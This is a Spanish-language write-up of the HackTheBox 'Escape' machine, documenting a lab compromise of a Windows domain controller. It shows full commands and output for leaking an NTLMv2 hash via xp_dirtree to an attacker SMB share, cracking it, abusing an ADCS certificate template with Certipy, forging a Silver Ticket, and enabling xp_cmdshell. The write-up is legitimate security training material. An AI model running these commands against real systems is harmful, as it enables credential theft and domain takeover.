@@ -1,0 +1,561 @@
+---
+category: writeup
+platform: HackTheBox
+machine_name: Escape
+difficulty: Media
+title: "Máquina Escape"
+description: "Resolución de la máquina Escape de HackTheBox"
+tags: ["SMB Enumeration", "SQL Server Abuse", "NTLMv2 Hash leak/cracking", "Log analysis", "ADCS Certificate templates", "Silver Ticket"]
+---
+
+En esta máquina Windows encontraremos un recurso SMB con un PDF expuesto que nos da credenciales para acceder a una base de datos SQL Server, el usuario con el que nos conectaremos fue pensado para estar aislado de funciones peligrosas y otras bases de datos, pero se les olvidó restringir el acceso a una que nos permitirá obtener el hash NTLMv2 del usuario que corre el servicio, estando dentro del sistema como `sql_svc` encontraremos un log con una contraseña de otro usuario que tiene permisos para pedir plantillas de certificados para autenticación por PKINIT. Esto último nos permitirá tomar control total del sistema.
+
+<h2>ENUMERACIÓN</h2>
+
+La máquina tiene los puertos típicos de un controlador de dominio, a excepción del HTTP, por lo que aquí no estaremos viendo nada web.
+
+{% highlight bash %}
+# Nmap 7.93 scan initiated Mon Jun 19 17:07:19 2023 as: nmap -sS -Pn -n -p- --open -oN ports -vvv --min-rate 200 10.10.11.202
+Nmap scan report for 10.10.11.202
+Host is up, received user-set (0.18s latency).
+Scanned at 2023-06-19 17:07:19 -04 for 438s
+Not shown: 65515 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+1433/tcp  open  ms-sql-s         syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+5985/tcp  open  wsman            syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+49667/tcp open  unknown          syn-ack ttl 127
+49687/tcp open  unknown          syn-ack ttl 127
+49688/tcp open  unknown          syn-ack ttl 127
+49704/tcp open  unknown          syn-ack ttl 127
+49708/tcp open  unknown          syn-ack ttl 127
+49714/tcp open  unknown          syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Mon Jun 19 17:14:37 2023 -- 1 IP address (1 host up) scanned in 437.52 seconds
+{% endhighlight %}
+
+Por SMB tenemos acceso anónimo a un recurso compartido llamado "Public".
+
+{% highlight bash %}
+❯ smbmap -u "guest" -H 10.10.11.202
+[+] IP: 10.10.11.202:445	Name: dc.sequel.htb       	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	IPC$                                              	READ ONLY	Remote IPC
+	NETLOGON                                          	NO ACCESS	Logon server share 
+	Public                                            	READ ONLY	
+	SYSVOL                                            	NO ACCESS	Logon server share 
+{% endhighlight %}
+
+El dominio es "sequel.htb", y parece que el nombre de la máquina es "dc"; por lo que antes de continuar no te olvides de agregar dicho dominio a tu archivo de hosts.
+
+Continuando con los recursos, Public tiene un archivo PDF.
+
+{% highlight bash %}
+❯ smbmap -r Public -u "guest" -H 10.10.11.202
+[+] IP: 10.10.11.202:445	Name: dc.sequel.htb       	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	Public                                            	READ ONLY	
+	.\Public\\*
+	dr--r--r--                0 Sat Nov 19 07:51:25 2022	.
+	dr--r--r--                0 Sat Nov 19 07:51:25 2022	..
+	fr--r--r--            49551 Sat Nov 19 07:51:25 2022	SQL Server Procedures.pdf
+{% endhighlight %}
+
+Descárgandolo, vemos que es un documento que nos dice que esta empresa ha tenido problemas últimamente con sus instancias de SQL Server (en parte por según, Ryan), por lo que Tom pensó que sería buena idea escribir un procedimiento en como acceder y probar cualquier cambio en la base de datos en caso de incidencias o que los Juniors no tengan a sus Seniors. Aclaran que esto no será hecho en el servidor de producción y que Tom cuando vuelva de vacaciones removerá la instancia.
+
+{% highlight bash %}
+❯ smbmap --download "Public/SQL Server Procedures.pdf" -u "guest" -H 10.10.11.202
+[+] Starting download: Public\SQL Server Procedures.pdf (49551 bytes)
+[+] File output to: /home/vzon/Documentos/targets/escape/10.10.11.202-Public_SQL Server Procedures.pdf
+{% endhighlight %}
+
+![Document](/assets/writeups/escape/1.png)
+
+En la segunda página del documento se nos comenta que si somos recién contratados esperando a que nos creen nuestros usuarios podemos echarle un vistazo a la base de datos con una credencial
+
+![Credentials](/assets/writeups/escape/2.png)
+
+*La contraseña raramente dice que el usuario invitado no puede escribir*
+
+Si probamos a entrar con estas credenciales al SQL Server, podremos hacerlo sin problemas.
+
+{% highlight bash %}
+❯ mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
+Impacket v0.10.1.dev1+20230616.115447.d1f16d8e - Copyright 2022 Fortra
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
+[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (PublicUser  guest@master)>
+{% endhighlight %}
+
+Pero no parece tener mucho...
+
+{% highlight bash %}
+SQL (PublicUser  guest@master)> SELECT name FROM sys.databases;
+name     
+------   
+master   
+
+tempdb   
+
+model    
+
+msdb     
+
+SQL (PublicUser  guest@master)> select name from sys.tables;
+name               
+----------------   
+spt_fallback_db    
+
+spt_fallback_dev   
+
+spt_fallback_usg   
+
+spt_monitor        
+{% endhighlight %}
+
+A ver que hacemos con esto.
+
+<h2>INTRUSIÓN</h2>
+
+Buscando por comandos que no deberíamos poder usar encontramos el `xp_dirtree`
+
+{% highlight bash %}
+SQL (PublicUser  guest@master)> xp_dirtree
+subdirectory   depth   file   
+------------   -----   ----   
+{% endhighlight %}
+
+Con esto podemos ver archivos de la máquina, asi como ver recursos SMB externos, y un recurso SMB externo al ser cargado mediante esta forma, normalmente hace que el usuario se intente autenticar con sus credenciales automáticamente...
+
+Si nos creamos un recurso SMB e intentamos listarlo con el comando que encontramos, pues
+
+{% highlight bash %}
+SQL (PublicUser  guest@master)> xp_dirtree \\10.10.16.4\uwu
+{% endhighlight %}
+
+{% highlight bash %}
+Impacket v0.10.1.dev1+20230616.115447.d1f16d8e - Copyright 2022 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.11.202,51100)
+[*] AUTHENTICATE_MESSAGE (sequel\sql_svc,DC)
+[*] User DC\sql_svc authenticated successfully
+[*] sql_svc::sequel:aaaaaaaaaaaaaaaa:6f6a4a7d7965cff1887f2a7835eec187:...
+[*] Closing down connection (10.10.11.202,51100)
+{% endhighlight %}
+
+Estuvo algo sencillo pero bueno, este hash podemos intentar crackearlo y obtener la contraseña del usuario; por suerte no nos toma mucho hacerlo
+
+{% highlight bash %}
+❯ john -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Warning: detected hash type "netntlmv2", but the string is also recognized as "ntlmv2-opencl"
+Use the "--format=ntlmv2-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+REGGIE1234ronnie (sql_svc)
+1g 0:00:00:06 DONE (2023-06-19 18:07) 0.1512g/s 1618Kp/s 1618Kc/s 1618KC/s RENZOH..REDMAN36
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed
+{% endhighlight %}
+
+Viendo los permisos de este usuarios, ¡descubrimos que tiene acceso a WinRM!
+
+{% highlight bash %}
+❯ cme winrm 10.10.11.202 -u "sql_svc" -p "REGGIE1234ronnie"
+SMB         10.10.11.202    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
+HTTP        10.10.11.202    5985   DC               [*] http://10.10.11.202:5985/wsman
+WINRM       10.10.11.202    5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
+{% endhighlight %}
+
+Vamos a entrar por WinRM y tomar la primera fl... eh, ¿cuál flag?
+
+{% highlight bash %}
+❯ evil-winrm -i 10.10.11.202 -u "sql_svc" -p "REGGIE1234ronnie"
+
+Evil-WinRM shell v3.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\sql_svc\Documents> cd ..
+*Evil-WinRM* PS C:\Users\sql_svc> cd Desktop
+*Evil-WinRM* PS C:\Users\sql_svc\Desktop> ls -Force
+*Evil-WinRM* PS C:\Users\sql_svc\Desktop>
+{% endhighlight %}
+
+uh, parece que este usuario solamente tiene la función de como lo dice su nombre... ser un servicio.
+
+Pero siendo un servicio deberíamos tener algún acceso especial, buscando por archivos encontramos lo que parece ser la raíz del SQL Server
+
+{% highlight powershell %}
+*Evil-WinRM* PS C:\> ls -Force
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d--hs-         2/1/2023   6:37 PM                $Recycle.Bin
+d--hsl        7/20/2021  12:20 PM                Documents and Settings
+d-----         2/1/2023   8:15 PM                PerfLogs
+d-r---         2/6/2023  12:08 PM                Program Files
+d-----       11/19/2022   3:51 AM                Program Files (x86)
+d--h--         2/7/2023   2:58 PM                ProgramData
+d-----       11/19/2022   3:51 AM                Public
+d--hs-        7/20/2021  12:20 PM                Recovery
+d-----        6/19/2023   5:21 PM                SQLServer
+d--hs-       11/18/2022   9:09 AM                System Volume Information
+d-r---         2/1/2023   1:55 PM                Users
+d-----         2/6/2023   7:21 AM                Windows
+-a-hs-        6/18/2023  11:35 PM      738197504 pagefile.sys
+
+
+*Evil-WinRM* PS C:\> cd SQLServer
+{% endhighlight %}
+
+Tiene una carpeta de Logs con un archivo llamado `ERRORLOG.BAK` dentro, estos son registros obviamente, solo que en vez de ser precisamente errores parecen de la misma rutina del SQL Server
+
+{% highlight log %}
+2022-11-18 13:43:05.96 Server      Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
+	Sep 24 2019 13:48:23
+	Copyright (C) 2019 Microsoft Corporation
+	Express Edition (64-bit) on Windows Server 2019 Standard Evaluation 10.0 <X64> (Build 17763: ) (Hypervisor)
+
+2022-11-18 13:43:05.97 Server      UTC adjustment: -8:00
+2022-11-18 13:43:05.97 Server      (c) Microsoft Corporation.
+2022-11-18 13:43:05.97 Server      All rights reserved.
+2022-11-18 13:43:05.97 Server      Server process ID is 3788.
+2022-11-18 13:43:05.97 Server      System Manufacturer: 'VMware, Inc.', System Model: 'VMware7,1'.
+2022-11-18 13:43:05.97 Server      Authentication mode is MIXED.
+2022-11-18 13:43:05.97 Server      Logging SQL Server messages in file 'C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\Log\ERRORLOG'.
+2022-11-18 13:43:05.97 Server      The service account is 'NT Service\MSSQL$SQLMOCK'. This is an informational message; no user action is required.
+2022-11-18 13:43:05.97 Server      Registry startup parameters:
+	-d C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\master.mdf
+	-e C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\Log\ERRORLOG
+	-l C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\mastlog.ldf
+2022-11-18 13:43:05.97 Server      Command Line Startup Parameters:
+	-s "SQLMOCK"
+	-m "SqlSetup"
+	-Q
+	-q "SQL_Latin1_General_CP1_CI_AS"
+	-T 4022
+	-T 4010
+	-T 3659
+	-T 3610
+	-T 8015
+{% endhighlight %}
+
+Husmeando por este archivo un poco, vemos mensajes de los spids (Creo Server Process IDs), pero terminando encontramos algo muy interesante; un intento fallido de autenticación por parte de Ryan.Cooper y, ¿Mosquito Nuclear 3?
+
+{% highlight log %}
+2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
+2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
+2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+{% endhighlight %}
+
+No parece un nombre de usuario común, si nos mas bien una contraseña. Probándola con el usuario de arriba vemos que es la correcta y además también está en el grupo "Remote Management Users"...
+
+{% highlight bash %}
+❯ cme winrm 10.10.11.202 -u "ryan.cooper" -p "NuclearMosquito3"
+SMB         10.10.11.202    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
+HTTP        10.10.11.202    5985   DC               [*] http://10.10.11.202:5985/wsman
+WINRM       10.10.11.202    5985   DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3 (Pwn3d!)
+{% endhighlight %}
+
+Al autenticarnos como este usuario y ver el escritorio ya podremos ver la primera flag
+
+{% highlight bash %}
+❯ evil-winrm -i 10.10.11.202 -u "ryan.cooper" -p "NuclearMosquito3"
+
+Evil-WinRM shell v3.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> cd ../Desktop
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> ls
+
+
+    Directory: C:\Users\Ryan.Cooper\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        6/18/2023  11:36 PM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> cat user.txt
+56019e02ce766dd1f5f302b461******
+{% endhighlight %}
+
+<h2>ESCALADA DE PRIVILEGIOS</h2>
+
+Viendo nuestro grupos nos percatamos de uno especial; el de servicio de certificados
+
+{% highlight powershell %}
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID          Attributes
+=========================================== ================ ============ ==================================================
+Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+{% endhighlight %}
+
+Parece que esta máquina tiene instalado ADCS (Active Directory Certificate Services); buscando por internet formas de abusarlo encontraremos que si existen plantillas de certificados de autenticación mal configuradas podemos hacernos con el usuario Administrador. Estas plantillas normalmente son aquellas las cuales podemos "matricular" y permiten autenticarse como otros usuarios.
+
+Buscando por ellas encontramos una extraña:
+
+{% highlight powershell %}
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> certutil -template
+...
+Template[31]:
+  TemplatePropCommonName = UserAuthentication
+  TemplatePropFriendlyName = UserAuthentication
+  TemplatePropSecurityDescriptor = O:LAG:S-1-5-21-4078382237-1492182817-2568127209-519D:PAI(D;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-4078382237-1492182817-2568127209-1106)(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;DA)...
+
+    Deny Full Control	sequel\sql_svc
+    Allow Enroll	sequel\Domain Admins
+    Allow Enroll	sequel\Domain Users
+    Allow Enroll	sequel\Enterprise Admins
+    Allow Full Control	sequel\Domain Admins
+    Allow Full Control	sequel\Enterprise Admins
+    Allow Full Control	sequel\Administrator
+    Allow Read	NT AUTHORITY\Authenticated Users
+...
+{% endhighlight %}
+
+Herramientas automatizadas como Certify y Certipy nos marcan esta plantilla como vulnerable, creo que no hay que explicar el por qué ya que se ve en los permisos que tiene y su nombre.
+
+Vamos a usar certipy para crear una petición de este certificado en nombre del usuario Administrador a ver si podemos usar el certificado que nos devuelva en el protocolo PKINIT de Kerberos. Primero debemos obtener el nombre del CA que los puedes hacer con certutil y luego simplemente colocar en el UPN del certificado el de Administrador
+
+{% highlight bash %}
+# UPN: User Principle Name
+# CA: Certificate Authority o Autoridad de certificados
+❯ certipy req -dc-ip 10.10.11.202 -u ryan.cooper@sequel.htb -p NuclearMosquito3 -template UserAuthentication -upn Administrator@sequel.htb -ca sequel-DC-CA
+Certipy v4.5.1 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 13
+[*] Got certificate with UPN 'Administrator@sequel.htb'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+{% endhighlight %}
+
+Bueno, nos dejó sin problemas al igual que intentar autenticarnos con este certificado...
+
+{% highlight bash %}
+# Debemos sincronizar nuestro reloj con la hora del controlador de dominio ya que Kerberos no permite mucha diferencia en la hora al autenticarse.
+❯ sudo ntpdate 10.10.11.202
+20 Jun 02:58:49 ntpdate[46666]: step time server 10.10.11.202 offset +28792.352734 sec
+❯ getTGTPKINIT.py -cert-pfx administrator.pfx -dc-ip dc.sequel.htb sequel.htb/Administrator a.ccache
+2023-06-20 02:58:51,409 minikerberos INFO     Loading certificate and key from file
+INFO:minikerberos:Loading certificate and key from file
+2023-06-20 02:58:51,500 minikerberos INFO     Requesting TGT
+INFO:minikerberos:Requesting TGT
+2023-06-20 02:58:55,670 minikerberos INFO     AS-REP encryption key (you might need this later):
+INFO:minikerberos:AS-REP encryption key (you might need this later):
+2023-06-20 02:58:55,670 minikerberos INFO     3d686342186021ea5459b8efef6127429236adb66679ee211980537c960d6e85
+INFO:minikerberos:3d686342186021ea5459b8efef6127429236adb66679ee211980537c960d6e85
+2023-06-20 02:58:55,674 minikerberos INFO     Saved TGT to file
+INFO:minikerberos:Saved TGT to file
+{% endhighlight %}
+
+Ahora usando este TGT podemos simplemente pedir un TGS para el servicio SMB y tomar la última flag.
+
+{% highlight bash %}
+❯ export KRB5CCNAME=a.ccache
+❯ getST.py -spn cifs/dc.sequel.htb -k -no-pass sequel.htb/Administrator
+Impacket v0.10.1.dev1+20230616.115447.d1f16d8e - Copyright 2022 Fortra
+
+[*] Getting ST for user
+[*] Saving ticket in Administrator.ccache
+❯ export KRB5CCNAME=Administrator.ccache
+❯ wmiexec.py -no-pass -k sequel.htb/Administrator@dc.sequel.htb
+Impacket v0.10.1.dev1+20230616.115447.d1f16d8e - Copyright 2022 Fortra
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>cd Users
+C:\Users>cd Administrator\Desktop
+C:\Users\Administrator\Desktop>dir
+ Volume in drive C has no label.
+ Volume Serial Number is EB33-4140
+
+ Directory of C:\Users\Administrator\Desktop
+
+02/06/2023  04:43 PM    <DIR>          .
+02/06/2023  04:43 PM    <DIR>          ..
+06/18/2023  11:36 PM                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   5,886,496,768 bytes free
+
+C:\Users\Administrator\Desktop>type root.txt
+94cb2aecfaf2ac8d921aef7e0d******
+{% endhighlight %}
+
+<h2>EXTRA</h2>
+
+¿Si lo notaste no?, el usuario sql_svc al ser un usuario de servicio técnicamente podemos usar su hash NTLMv2 para forjar tickets Kerberos de quien sea en el servicio de SQL Server, a este ataque normalmente se le conoce como "Silver Ticket".
+
+Vamos a replicarlo, primero necesitamos el hash NT del usuario de servicio en cuestión que puedes obtener simplemente hasheando su contraseña codificada con UTF-16LE en MD4 y el SID del dominio, el cual podemos obtener fácilmente de varias formas.
+
+{% highlight powershell %}
+*Evil-WinRM* PS C:\Users\sql_svc\Documents> Get-ADDomain
+
+
+AllowedDNSSuffixes                 : {}
+ChildDomains                       : {}
+ComputersContainer                 : CN=Computers,DC=sequel,DC=htb
+DeletedObjectsContainer            : CN=Deleted Objects,DC=sequel,DC=htb
+DistinguishedName                  : DC=sequel,DC=htb
+DNSRoot                            : sequel.htb
+DomainControllersContainer         : OU=Domain Controllers,DC=sequel,DC=htb
+DomainMode                         : Windows2016Domain
+DomainSID                          : S-1-5-21-4078382237-1492182817-2568127209
+ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=sequel,DC=htb
+Forest                             : sequel.htb
+InfrastructureMaster               : dc.sequel.htb
+LastLogonReplicationInterval       :
+LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=sequel,DC=htb}
+LostAndFoundContainer              : CN=LostAndFound,DC=sequel,DC=htb
+ManagedBy                          :
+Name                               : sequel
+NetBIOSName                        : sequel
+ObjectClass                        : domainDNS
+ObjectGUID                         : 7c4ace6b-9788-44a5-a1a6-8424bcb61f5b
+ParentDomain                       :
+PDCEmulator                        : dc.sequel.htb
+PublicKeyRequiredPasswordRolling   : True
+QuotasContainer                    : CN=NTDS Quotas,DC=sequel,DC=htb
+ReadOnlyReplicaDirectoryServers    : {}
+ReplicaDirectoryServers            : {dc.sequel.htb}
+RIDMaster                          : dc.sequel.htb
+SubordinateReferences              : {DC=ForestDnsZones,DC=sequel,DC=htb, DC=DomainDnsZones,DC=sequel,DC=htb, CN=Configuration,DC=sequel,DC=htb}
+SystemsContainer                   : CN=System,DC=sequel,DC=htb
+UsersContainer                     : CN=Users,DC=sequel,DC=htb
+{% endhighlight %}
+
+Usaremos la herramienta de impacket `ticketer.py` para forjar un ticket del usuario Administrador para el servicio de SQL Server
+
+{% highlight bash %}
+# Notar que puedes colocarle el SPN que quieras
+ ticketer.py -nthash 6f6a4a7d7965cff1887f2a7835eec187 -domain-sid S-1-5-21-4078382237-1492182817-2568127209 -spn "IlovePen*s/dc.sequel.htb" -domain sequel.htb Administrator
+Impacket v0.10.1.dev1+20230616.115447.d1f16d8e - Copyright 2022 Fortra
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for sequel.htb/Administrator
+[*] 	PAC_LOGON_INFO
+[*] 	PAC_CLIENT_INFO_TYPE
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*] 	PAC_SERVER_CHECKSUM
+[*] 	PAC_PRIVSVR_CHECKSUM
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Saving ticket in Administrator.ccache
+{% endhighlight %}
+
+y bueno, esto nos permite el acceso aún con lo que le hemos puesto de SPN
+
+{% highlight bash %}
+❯ export KRB5CCNAME=Administrator.ccache
+❯ klist
+Ticket cache: FILE:Administrator.ccache
+Default principal: Administrator@SEQUEL.HTB
+
+Valid starting     Expires            Service principal
+20/06/23 03:17:20  17/06/33 03:17:20  IlovePen*s/dc.sequel.htb@SEQUEL.HTB
+	renew until 17/06/33 03:17:20
+    ❯ mssqlclient.py -k -no-pass Administrator@dc.sequel.htb
+Impacket v0.10.1.dev1+20230616.115447.d1f16d8e - Copyright 2022 Fortra
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
+[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (sequel\Administrator  dbo@master)>
+{% endhighlight %}
+
+Siendo Administrador aquí podemos habilitar el resto de Stored Procedures delicadas y hacer cositas como escalar privilegios a SYSTEM directamente desde aquí.
+
+{% highlight bash %}
+SQL (sequel\Administrator  dbo@master)> sp_configure 'show advanced options',1
+[*] INFO(DC\SQLMOCK): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL (sequel\Administrator  dbo@master)> reconfigure
+SQL (sequel\Administrator  dbo@master)> sp_configure 'xp_cmdshell',1
+[*] INFO(DC\SQLMOCK): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL (sequel\Administrator  dbo@master)> reconfigure
+SQL (sequel\Administrator  dbo@master)> xp_cmdshell "whoami /priv"
+output                                                                             
+--------------------------------------------------------------------------------   
+NULL                                                                               
+
+PRIVILEGES INFORMATION                                                             
+
+----------------------                                                             
+
+NULL                                                                               
+
+Privilege Name                Description                               State      
+
+============================= ========================================= ========   
+
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
+SeMachineAccountPrivilege     Add workstations to domain                Disabled   
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
+SeCreateGlobalPrivilege       Create global objects                     Enabled    
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
+
+NULL     
+{% endhighlight %}
